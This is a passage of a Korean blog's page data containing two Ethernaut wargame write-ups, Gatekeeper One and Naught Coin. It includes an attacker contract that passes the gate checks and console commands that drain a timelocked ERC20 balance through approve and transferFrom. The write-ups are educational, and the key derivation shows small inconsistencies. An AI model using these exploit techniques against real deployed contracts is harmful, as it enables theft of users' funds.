punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div>\n<hr>\n<h2 id=\"풀이\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"풀이 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h2>\n<p>우리가 풀어야할 문제는 gate3 밖에 남지 않았다! Gate3는 <a href=\"https://www.tutorialspoint.com/solidity/solidity_conversions.htm\">Type Conversion</a>를 잘 알아야 풀 수 있다.</p>\n<p>3가지 조건에 만족해야하기 때문에 하나하나 확인해 보자!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part one\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part two\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span></code></pre></div>\n<br/>\n우선 마지막 조건을 보면 type conversion한 tx.origin과 _gateKey가 같아야 하는 것을 볼 수 있다. gateKey는 각자의 EOA에서 파생된다.   \n나의 EOA: 0x0d3D56806fe6eeDe410Ea9722da9a6f65FD24799\n<p>이제 첫번째 조건을 보자. 첫번째 조건은 다음과 같다.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<br/>\n우선 8 bytes인 _gateKey를 uint64로 바꾸면 어떻게 될까??\n나의 주소는 20 bytes로 구성되어있고 이를 8 bytes로 줄이게되면 뒤에 16자리만 남게된다.\n<ul>\n<li>0x2da9a6f65FD24799</li>\n</ul>\n<br/>\n나는 편의성을 위해 bytes로만 계산 할 것이다.   \n<ul>\n<li>uint32 = bytes4</li>\n<li>uint16 = bytes2</li>\n</ul>\n<p>우선 bytes8 를 bytes2로 바꾸면 아래 4자리만 보존된다.\n그리고 bytes8 를 bytes4로 바꾸면 아래 8자리만 보존된다.</p>\n<p>bytes2와 bytes4가 같으려면 다음과 같이 bytes4에 0000이 붙어있으면 된다.</p>\n<ul>\n<li>0x1234 = 0x00001234</li>\n</ul>\n<p>나의 account가 0x2da9a6f600004799와 같다면 첫번째 조건을 만족시킬 수 있다.</p>\n<br/>\n두번째 조건은 아래와 같다.\n```solidity\nrequire(uint32(uint64(_gateKey)) != uint64(_gateKey))\n``` \n첫번째 조건을 완벽하게 이해했다면 두번째 조건은 계산없이도 통과하는 것을 알 수 있다.\n0x2da9a6f000024799를 bytes4로 바꾸게 되면 0x00004799로 아래 8자리만 보존된다. \n보존된 bytes4와 bytes8이 같으려면 bytes8은 다음과 같아야한다. \n- 0x0000000000004799\n<p>그렇다면 우리는 1번에서 구한 값 그대로 넣는다면 2번 조건은 해결된다!</p>\n<br/>\n마지막 조건은 아래와 같다. \n```solidity\nrequire(uint32(uint64(_gateKey)) == uint16(tx.origin))\n```\n위 계산처럼 한번 계산해보자!\nuint32(uint64(_gateKey)는 bytes4가 되고 uint16은 bytes2가 된다. 위에서 말했듯이 tx.origin은 나의 account이다. 나의 account를 bytes2로 바꾸면 1번처럼 아래 4자리만 남게된다.  \n<ul>\n<li>0x4799</li>\n</ul>\n<p>이와 bytes4가 같으려면 bytes4의 값은 0x00004799 이면된다.\n우리는 위에서 우리의 account를 적용해 풀었음으로 이미 푼 것과 다름 없다ㅎㅎ!</p>\n<br/>\n나는 remix에 다음과 같은 코드를 작성하여 배포하고 위에서 찾은 _gateKey를 적용해 gatekeeperOne contract에 call을 보냈다.\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">GetEntrant</span> <span class=\"token punctuation\">{</span>\n       \n    GatekeeperOne gatekeeperOne<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _gatekeeperOne<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        gatekeeperOne <span class=\"token operator\">=</span> <span class=\"token function\">GatekeeperOne</span><span class=\"token punctuation\">(</span>_gatekeeperOne<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">enter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        gatekeeperOne<span class=\"token punctuation\">.</span>enter<span class=\"token punctuation\">{</span>gas<span class=\"token punctuation\">:</span> <span class=\"token number\">40955</span><span class=\"token operator\">+</span><span class=\"token number\">254</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  \n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>이후 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!</code></pre></div>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>지금까지 공부한 것 중 가장 어려웠으며 가장 공부를 많이 한 것 같다. 이 문제를 풀고나니 gatekeeper2가 기대된다ㅋㅋ\ngatekeeperOne을 통해 좀 더 깊은 곧을 들여다볼 수 있었다. 평소에 잘 하지않는 debugging과 type conversion에 따른 data 보존 및 손실을 더 잘 다룰 수 있게 된 것 같다. 또한 gas fee가 opcode마다 얼마나 생성되는지도 눈으로 확인해보았기 때문에 EVM에 대한 이해력이 좀 더 상승한 것 같다! gatekeeperTwo도 화이팅 해보자 :)</p>\n<hr>\n<h2 id=\"기타-정보\" style=\"position:relative;\"><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\" aria-label=\"기타 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>기타 정보</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n<li>Storage &#x26; Casting: <a href=\"https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183\">https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183</a></li>\n<li>Type Conversion: <a href=\"https://www.tutorialspoint.com/solidity/solidity_conversions.htm\">https://www.tutorialspoint.com/solidity/solidity_conversions.htm</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">코드 분석</a></li>\n<li><a href=\"#%ED%92%80%EC%9D%B4\">풀이</a></li>\n<li><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></li>\n<li><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\">기타 정보</a></li>\n</ul>\n</div>","frontmatter":{"date":"January 19, 2022","title":"(Ethernaut 취약점 13) Gatekeeper One - 2","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/ethernaut/13_gatekeeperOne_ethernaut/13_gatekepperOne_2_ethernaut/"}},"prev":{"id":"5065cce9-1f82-53a1-a1a9-3b4e5fd66708","html":"<h1 id=\"-privacy\" style=\"position:relative;\"><a href=\"#-privacy\" aria-label=\" privacy permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 Privacy</h1>\n<p><strong>Difficulty 5/10</strong></p>\n<ul>\n<li>승리 조건</li>\n<li>코드 분석</li>\n<li>풀이</li>\n</ul>\n<p>순서로 진행 될 것이다.</p>\n<hr>\n<h2 id=\"승리-조건\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"승리 조건 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>승리 조건</h2>\n<ul>\n<li>내가 가지고 있는 Naught Coin의 잔액을 0으로 만들기</li>\n</ul>\n<hr>\n<h2 id=\"코드-분석\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>코드 분석</h2>\n<p>분석은 주석에!\n주석중 영어로 쓰여있는 것은 기존 코드에 포함되어있던 것이다:)!\n더 자세한 설명은 코드 뒤에 나온다.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"> <span class=\"token keyword\">contract</span> <span class=\"token class-name\">NaughtCoin</span> <span class=\"token keyword\">is</span> ERC20 <span class=\"token punctuation\">{</span>\n\n    <span class=\"token comment\">// string public constant name = 'NaughtCoin';</span>\n    <span class=\"token comment\">// string public constant symbol = '0x0';</span>\n    <span class=\"token comment\">// uint public constant decimals = 18;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> timeLock <span class=\"token operator\">=</span> now <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> <span class=\"token number\">365</span> days<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> INITIAL_SUPPLY<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> player<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// constructor: NaughtCoin이라는 토큰을 만든다.</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _player<span class=\"token punctuation\">)</span> \n    <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span><span class=\"token string\">'NaughtCoin'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'0x0'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        player <span class=\"token operator\">=</span> _player<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 총 공급량 설정</span>\n        INITIAL_SUPPLY <span class=\"token operator\">=</span> <span class=\"token number\">1000000</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">decimals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// _totalSupply = INITIAL_SUPPLY;</span>\n        <span class=\"token comment\">// _balances[player] = INITIAL_SUPPLY;</span>\n        <span class=\"token comment\">// 총 공급량만큼 player에게 공급</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">,</span> INITIAL_SUPPLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> player<span class=\"token punctuation\">,</span> INITIAL_SUPPLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n\n    <span class=\"token comment\">// openzeppline의 ERC20.transfer()을 override한 function</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _value<span class=\"token punctuation\">)</span> override <span class=\"token keyword\">public</span> lockTokens <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        super<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>_to<span class=\"token punctuation\">,</span> _value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// 10년간 timelock이 걸려있다. 그래서 player는 10년간 token을 transfer하지 못한다.</span>\n    <span class=\"token comment\">// Prevent the initial owner from transferring tokens until the timelock has passed</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">lockTokens</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> player<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>now <span class=\"token operator\">></span> timeLock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span> \n<span class=\"token punctuation\">}</span> \n\n</code></pre></div>\n<hr>\n<h2 id=\"풀이\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"풀이 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h2>\n<p>NaughtCoin은 ERC20 토큰이며 당신은 이미 모든 토큰을 보유하고 있습니다. 중요한 건 10년의 폐쇄 기간이 지나야만 양도할 수 있다는 겁니다. 어떻게 하면 자유롭게 보낼 수 있는지 알아봐 주실 수 있나요? 토큰 잔액을 0으로 설정하여 이 수준을 완료하십시오.</p>\n<p>이 문제에서 우리의 목표는 우리가 가지고 있는 token의 개수를 0으로 만드는 것이다. 하지만 위 코드를 보면 알 수 있다시피 transfer은 10년간 사용할 수 없다. 그렇다면 어떻게 풀어야 할까?</p>\n<p>ERC20 token을 deploy 해봤다면 transfer이외에 토큰을 주고받을 수 있는 방법이 있다는 것을 알 것이다.</p>\n<p>ERC20에 관해서 잘 모른다면 이 문제를 풀 수 없다! <a href=\"https://eips.ethereum.org/EIPS/eip-20\">여기서</a> ERC20에 관해 배우고 오자.</p>\n<ul>\n<li><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/9b3710465583284b8c4c5d2245749246bb2e0094/contracts/token/ERC20/ERC20.sol\">openzeppline ERC20 contract</a></li>\n</ul>\n<p>ERC20은 transfer이 외에 transferFrom이라는 함수가 존재한다. transferFrom 함수는 다른 address에게 approve 받은 만큼의 토큰을 보낼 수 있게된다. 즉 A가 B에게 원하는 양만큼 approve, B가 자신에게 approve된 만큼 누구에게든 token을 보낼 수 있게된다.</p>\n<p>우리가 이 문제를 풀 수 있는 시나리오는 이렇다.</p>\n<ol>\n<li>player account이외의 account를 하나 더 생성한다. 생성한 account를 B라고 칭하겠다.</li>\n<li>player인 우리가 우리 자신에게 전체 token의 양만큼을 approve 해준다.</li>\n<li>우리는 approve받은 양만큼 transferFrom함수를 사용해 B에 이체한다.</li>\n<li>player의 token balance는 0이 된다.</li>\n</ol>\n<p>그렇다면 푸는 방법을 보며 좀 더 이해해보자\n풀기 전 metamask를 통해 account를 하나 더 생성한다.</p>\n<p>우선 console 창에서 실행시킨다\nctrl + shift + i를 눌러 console창을 활성화 시키자</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 먼저 우리가 이채해야할 token의 양을 파악해야한다.</span>\n<span class=\"token keyword\">let</span> playerBalance <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">)</span>\nplayerBalance<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"1000000000000000000000000\"</span>\n\n<span class=\"token comment\">// player 자신에게 토큰 이체 권한을 부여한다.</span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">,</span><span class=\"token string\">\"1000000000000000000000000\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// B account에게 모든 token을 이체한다.</span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">,</span> <span class=\"token string\">\"0x690A732BA98fcfe72bDedE2085816BCF6498058d\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1000000000000000000000000\"</span><span class=\"token punctuation\">)</span>\n</code></pre></div>\n<p>이후 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!</code></pre></div>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>이번 문제에서는 ERC20 토큰에 대한 개념을 다루는 것 같다. ERC20에 대해서 잘 이해하고 있다면 쉽게 풀 수 있는 문제였다고 생각한다. 문제를 풀면 나오는 설명에서도 contract를 만든 사람은 ERC20에 대해 잘 모르는 사람일 것이라고 말했다. ERC20은 Defi와 여러 서비스에서 사용하고 있는 <strong>표쥰</strong> 이기 때문에 필수 적으로 자세히 알아야한다고 생각한다. 앞으로 여러 contract를 분석해보면서 더 깊은 이해를 해보자^^!</p>\n<hr>\n<h2 id=\"기타-정보\" style=\"position:relative;\"><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\" aria-label=\"기타 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>기타 정보</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n<li>참고 자료: <a href=\"https://medium.com/coinmonks/ethernaut-lvl-14-gatekeeper-2-walkthrough-how-contracts-initialize-and-how-to-do-bitwise-ddac8ad4f0fd\">https://medium.com/coinmonks/ethernaut-lvl-14-gatekeeper-2-walkthrough-how-contracts-initialize-and-how-to-do-bitwise-ddac8ad4f0fd</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">승리 조건</a></li>\n<li><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">코드 분석</a></li>\n<li><a href=\"#%ED%92%80%EC%9D%B4\">풀이</a></li>\n<li><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></li>\n<li><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\">기타 정보</a></li>\n</ul>\n</div>","frontmatter":{"date":"January 22, 2022","title":"(Ethernaut 취약점 15) Naught Coin","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/ethernaut/15_naughtCoin_ethernaut/15_naughtCoin_ethernaut/"}},"site":{"siteMetadata":{"siteUrl":"https://holyhansss.github.io","comments":{"utterances":{"repo":""}}}}},"pageContext":{"slug":"/ethernaut/14_gatekeeperTwo_ethernaut/14_gatekeeperTwo_ethernaut/","nextSlug":"/ethernaut/13_gatekeeperOne_ethernaut/13_gatekepperOne_2_ethernaut/","prevSlug":"/ethernaut/15_naughtCoin_ethernaut/15_naughtCoin_ethernaut/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}